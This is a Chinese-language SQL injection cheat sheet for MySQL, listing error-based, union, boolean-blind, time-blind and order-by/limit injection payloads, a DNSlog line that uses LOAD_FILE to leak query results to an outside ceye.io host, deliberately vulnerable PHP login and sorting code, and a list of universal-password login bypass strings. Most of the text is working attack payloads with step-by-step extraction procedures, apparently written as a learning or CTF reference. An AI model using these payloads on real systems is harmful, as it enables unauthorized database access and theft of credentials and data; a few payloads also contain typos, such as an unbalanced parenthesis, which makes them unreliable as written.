[toc]

## SQL注入类型

### 报错注入

#### 1、通过floor报错

```
select 1 from (select count(*),concat(floor(rand(0)*2),user())a from information_schema.tables group by a)b
```

#### 2、通过ExtractValue报错

extractvalue(1, concat(0x5c, (select user()),0x5c))

#### 3、通过UpdateXml报错

updatexml(1,concat(0x3a,(select user())),1)

#### 4、通过join报错(爆列名)

select * from(select * from 表名 a join 表名 b)c;

```
mysql> select * from(select * from mysql.user a join mysql.user b)c;
ERROR 1060 (42S21): Duplicate column name 'Host'
mysql> select * from(select * from mysql.user a join mysql.user b using(host))c;
ERROR 1060 (42S21): Duplicate column name 'User'
mysql> select * from(select * from mysql.user a join mysql.user b using(host,User))c;
ERROR 1060 (42S21): Duplicate column name 'Password'
```

#### 5、通过exp报错 (5.5.44通过，5.5.53以上不行)

exp(~(select * from (select user())a))

#### 6、通过GeometryCollection()报错(5.5.44通过，5.5.53以上不行)

GeometryCollection((select * from (select * from (select user())a)b))

#### 7、通过polygon ()报错(5.5.44通过，5.5.53以上不行)

polygon((select * from (select * from (select user())a)b))

#### 8、通过multipoint ()报错(5.5.47上通过，5.7.17上则不行)

multipoint((select * from (select * from (select version())a)b))

#### 9、通过UUID()报错 8.0.0以上可用

BIN_TO_UUID((SELECT version()))

#### 10、通过UUID()报错 (5.7以上通过)

select gtid_subset(version(),1)

#### 11、用户变量报错

```
select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2)
```

### 联合注入

UNION操作符用于合并两个或多个SELETC语句的结果集

注意事项：

1. 只有最后一个SELECT 语句允许有ORDER BY；

   select * from users order by id union select 1,2,3;错误

2. 只有最后一个SELECT语句允许有LIMIT

   select * from users limit 0,1 union select 1,2,3 错误

3. 只要UNION连接的几个查询字段数一样且列的数据类型转换没有问题，就可以查询出结果

4. 注入页面有回显

#### 注入流程

1. 判断是否存在注入点

2. 利用order by 确定列数

   ```
   id=1 order by 1 #正常
   id=1 order by 5 #错误
   id=1 order by 4 #正常，说明有4列
   ```

3. 判断显示位

   id=-1 union select 1,2,3,4 

   #必须指定id值是一个不存在的值，页面才能显示后面select结果,找到页面显示的数字确定显示位

4. 在显示位插入要查询的任何语句，如下示例

   ```
   id=-1 union select 1,database(),user(),4
   ```

### 盲注

#### 布尔型盲注

基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回`True`（页面）和`False`（页面）。
这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息

##### 注入流程

###### 判断注入点

id=1’ and 1=1 #页面正常

id=1' and 1=2 #页面不正常

###### 盲注常用函数

```
length()              #返回字符串的长度，例如可以返回数据库名字的长度 
substr()              #⽤来截取字符串 
ascii()		          #返回字符的ascii码
sleep(n)              #将程序挂起⼀段时间，n为n秒
if(expr1,expr2,expr3) #判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句
```

###### 通过true和false爆数据

```
id=1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=5 #修改数字，直到页面正常，得到当前数据库第一个表的长度
id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))='t' #修改substr(str,1,1)里面数字猜解每个字母，得到表名
id=1' and (select count(column_name) from information_schema.columns where table_name='表名')=8 #爆字段数
id=1' and length(substr((select column_name from information_schema.columns where table_name= '表名' limit 0,1),1))=7 #爆第一个字段长度
id=1' and substr((select column_name from information_schema.columns where table_name= '表名' limit 0,1),1,1)='a'#爆字段名
id=1' and ascii(substr((select user from 库名.表名 limit 0,1),1,1))=97 #爆字段数据
```

#### 时间型盲注

适用于注入点页面返回无变化的页面。只有通过页面返回时间判断。

##### sleep()进行延时注入

```
id=1' and if(length(database())=8,sleep(10),1)--+#判断数据库长度是不是8个字符，如果是延时10秒
id=1' and If(ascii(substr(database(),1,1))=115,sleep(10),1)--+ #截取数据库每个字符判断，直到爆出数据库名
```

##### benchmark()进行延时注入

benchmark()是重复执行某表达式

```
benchmark(5000000,md5(1));  #重复执行5000000次md5(1),替换sleep()作用
```



#### DNSlog注入

盲注由于爆数据太慢，这里用DNSlog方式可以快速获取数据

用户文件权限为空  @@secure_file_priv

申请一个DNS接收平台比如：ko8jyt.ceye.io

```
 SELECT LOAD_FILE(CONCAT('\\\\',(select version()),'.ko8jyt.ceye.io\\abc')); #成功可在平台上看到记录
```

## 其它注入点

### limit 注入

#### 不存在 order by 关键字

> select id from users limit [注入点]

这种可以用union进行联合查询注入

```
select id from users limit 0,1 union select username from users;
```



#### 存在 order by 关键字

> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT [注入点]

payload(5.0.0< MySQL <5.6.6):

```
procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); #extrctvalue报错注入
procedure analyse(updatexml(1,concat(0x3a,(select version())),1),1);#updatexml报错注入

PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);  #如果不支持报错就用time-based 的注入，这里不能用sleep而只能用 BENCHMARK
```

### order by 注入

order by是mysql中对查询数据进行排序的方法， 使用示例

```
select * from 表名 order by 列名(或者数字) asc；升序(默认升序)
select * from 表名 order by 列名(或者数字) desc；降序
```

这里的重点在于order by后既可以填列名或者是一个数字。举个例子： id是user表的第一列的列名，那么如果想根据id来排序，有两种写法:

```
select * from user order by id;
selecr * from user order by 1;
```

#### order by 与 报错注入

当页面会展示出MYSQL的错误信息时，可以使用报错注入。

> select * from test order by user_id and(updatexml(1,concat(0x7e,(select user())),0))

#### order by 与 union 联合查询

•当 $query = "select * from users order by id $input ";没有使用括号包裹的时候，是无法直接使用union查询的。

•当 $query = "(select * from users order by id $input) ";使用括号进行包裹的时候，此时是可以进行union查询的。



order by是mysql中对查询数据进行排序的方法， 使用示例

```
select * from 表名 order by 列名(或者数字) asc；升序(默认升序)
select * from 表名 order by 列名(或者数字) desc；降序
```

这里的重点在于order by后既可以填列名或者是一个数字。举个例子： id是user表的第一列的列名，那么如果想根据id来排序，有两种写法

```
select * from user order by id;
selecr * from user order by 1;
```

这个是在安恒杯月赛上看到的。 后台关键代码

```
$sql = 'select * from admin where username='".$username."'';
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if(isset($row)&&row['username']!="admin"){
    $hit="username error!";
}else{
    if ($row['password'] === $password){
        $hit="";
    }else{
        $hit="password error!";
    }

}
```

payload

```
username=admin' union 1,2,'字符串' order by 3
```

sql语句就变为

```
select * from admin where username='admin' or 1 union select 1,2,binary '字符串' order by 3;
```

这里就会对第三列进行比较，即将字符串和密码进行比较。然后就可以根据页面返回的不同情况进行盲注。 注意的是最好加上binary，因为order by比较的时候不区分大小写。

示例

```
mysql> select id,username,password from fa_admin where username ='' or 1 union select 1,2,'z' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  2 | test     | f0e1528ff82611ec9f49f7fdc135e535 |
|  1 | admin    | ff35c9d44ec654681d5822288edca5a3 |
|  1 | 2        | z                                |
+----+----------+----------------------------------+
3 rows in set (0.03 sec)

mysql> select id,username,password from fa_admin where username ='' or 1 union select 1,2,'a' order by 3;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | 2        | a                                |
|  2 | test     | f0e1528ff82611ec9f49f7fdc135e535 |
|  1 | admin    | ff35c9d44ec654681d5822288edca5a3 |
+----+----------+----------------------------------+
3 rows in set (0.03 sec)
```

这里的order by 3是根据第三列进行排序，如果我们union查询的字符串比password小的话，我们构造的 1,2,a就会成为第一列，那么在源码对用户名做对比的时候，就会返回username error!，如果union查询的字符串比password大，那么正确的数据就会是第一列，那么页面就会返回password error!.

这里就来说一下我们上面的payload：
我们想要爆破密码，那么我们可以轮流带入查询来观察排序情况，那么之后一定能注入出密码。

#### order by 盲注

当页面并没有展示MYSQL的错误信息时，且只能根据页面的回显数据的状态进行判断时，可使用布尔盲注

> select * from users order by id ^(select(select version()) regexp '^aaaa')

> select * from users order by id ^(select(select version()) regexp '^5')

简单解释一下就是在regexp正则匹配的时候，如果匹配到数据返回1(00000001)的时候，此时的1会和id中的数据的二进制进行异或，按照异或的结果进行升序排列，所以显示的排列会发生变化；反之当进行正则匹配的时候，未匹配到数据返回0(00000000)，此时数字和0异或的结果还是本身，所以显示的排列不会发生改变。

总结：当页面排序紊乱时则说明正则匹配到正确数据，页面排序未发生紊乱时则说明正则没有匹配到数据

通过以上可以判断数据库版本在5以上，这里的^5 也可以转换成^5的十六进制,这样语句中就没了引号.

##### 基于if()盲注

**需要知道列名**

order by的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。

示例：

order by if(1=1,id,username);
这里光看一个这个示例对我这个丑新来说太抽象了，来用具体语句解释：

```
case when (true) then id else username end

if((select ascii(substr(table_name,1,1)) from information_schema.tables limit 1)<=128,id,username)
```

条件判断之后需要选择字段名，如: id，username，这里如果使用数字代替列名是不行的，因为if语句返回的是字符类型，不是整型。所以必须知道字段名。
和上面的payload解释一样，我们可以通过一位一位的比较来得到我们想知道的字段。

**不需要知道列名**

payload

```
order by if(表达式,1,(select id from information_schema.tables))
```

如果表达式为false时，sql语句会报ERROR 1242 (21000): Subquery returns more than 1 row的错误，导致查询内容为空，如果表达式为true是，则会返回正常的页面。

##### 基于时间的盲注

order by if(1=1,1,sleep(1))
结果：

```
select * from ha order by if(1=1,1,sleep(1)); #正常时间
select * from ha order by if(1=2,1,sleep(1)); #有延迟
```

同样的，我们可以在上面的payload中替换我们想要的语句
比如：

```
order by if((select ascii(substr(table_name,1,1)) from information_schema.tables limit 1)<=128,1,sleep(1))
```

##### 基于rang()的盲注

原理不赘述了，直接看测试结果

```
mysql> select * from ha order by rand(true);
+----+------+
| id | name |
+----+------+
|  9 | NULL |
|  6 | NULL |
|  5 | NULL |
|  1 | dss  |
|  0 | dasd |
+----+------+
mysql> select * from ha order by rand(false);
+----+------+
| id | name |
+----+------+
|  1 | dss  |
|  6 | NULL |
|  0 | dasd |
|  5 | NULL |
|  9 | NULL |
+----+------+
```

可以看到当rang()为true和false时，排序结果是不同的，所以就可以使用rang()函数进行盲注了。 例

```
order by rand(ascii(mid((select database()),1,1))>96)
```

##### order by后的报错注入

这个有点特殊，因为他仅仅是一种特别的情况，不如上面的通用，所以我放在最后来说。

源码：

```
<?php
error_reporting(0);
session_start();
mysql_connect("127.0.0.1", "root", "root") or die("Database connection failed ");
mysql_select_db("sqlidemo") or die("Select database failed");

$order = $_GET['order'] ? $_GET['order'] : 'name';
$sql = "select id,name,price from goods order by $order";
$result = mysql_query($sql);
$reslist = array();
while($row = mysql_fetch_array($result, MYSQL_ASSOC))
{
 array_push($reslist, $row);
}
echo json_encode($reslist);
create database sqlidemo;
```

这里的话就是order by 后面的参数可控，我们对他进行恶意传参来达到sql注入情况。

"select * from goods order by $_GET['order']"

在早期注入大量存在的时候利用order by子句进行快速猜解列数，再配合union select语句进行回显。可以通过修改order参数为较大的整数看回显情况来判断。在不知道列名的情况下可以通过列的的序号来指代相应的列。但是经过测试这里无法做运算，如order=3-1 和order=2是不一样的
**payload:**

```
/?order=IF(1=1,name,price) 通过name字段排序
/?order=IF(1=2,name,price) 通过price字段排序
```

解释见上文。

rand函数也能达到类似的效果，可以观测到排序的结果不一样

```
/?order=rand(1=1) 
/?order=rand(1=2)
```

**利用报错**

返回多条记录

```
/?order=IF(1=1,1,(select+1+union+select+2)) 正确
/?order=IF(1=2,1,(select+1+union+select+2)) 错误


/?order=IF(1=1,1,(select+1+from+information_schema.tables)) 正常
/?order=IF(1=2,1,(select+1+from+information_schema.tables)) 错误
```

**利用regexp**

```
/?order=(select+1+regexp+if(1=1,1,0x00)) 正常
/?order=(select+1+regexp+if(1=2,1,0x00)) 错误
```

**利用updatexml**

```
/?order=updatexml(1,if(1=1,1,user()),1) 正确
/?order=updatexml(1,if(1=2,1,user()),1) 错误
```

**利用extractvalue**

```
/?order=extractvalue(1,if(1=1,1,user())) 正确
/?order=extractvalue(1,if(1=2,1,user())) 错误
```

**数据猜解**

```
/?order=(select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) 正确
/?order=(select+1+regexp+if(substring(user(),1,1)=0x71,1,0x00)) 错误

可以得知user()第一位为r,ascii码的16进制为0x72

猜解当前数据库的表名：

/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x67,1,0x00)) 正确
/?order=(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)=0x66,1,0x00)) 错误

猜解指定表名中的列名：

/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x69,1,0x00)) 正常
/?order=(select+1+regexp+if(substring((select+concat(column_name)from+information_schema.columns+where+table_schema%3ddatabase()+and+table_name%3d0x676f6f6473+limit+0,1),1,1)=0x68,1,0x00)) 错误
```

### 登陆框的注入

万能密码基本大家都用过，各种各样的，如下

```
'or 1=1/*
"or "a"="a
"or 1=1--
"or"="
"or"="a'='a
"or1=1--
"or=or"
''or'='or'
') or ('a'='a
'.).or.('.a.'='.a
'or 1=1
'or 1=1--
'or 1=1/*
'or"="a'='a
'or' '1'='1'
'or''='
'or''=''or''='
'or'='1'
'or'='or'
'or.'a.'='a
'or1=1--
1'or'1'='1
a'or' 1=1--
a'or'1=1--
or 'a'='a'
or 1=1--
or1=1--
'|0#
```

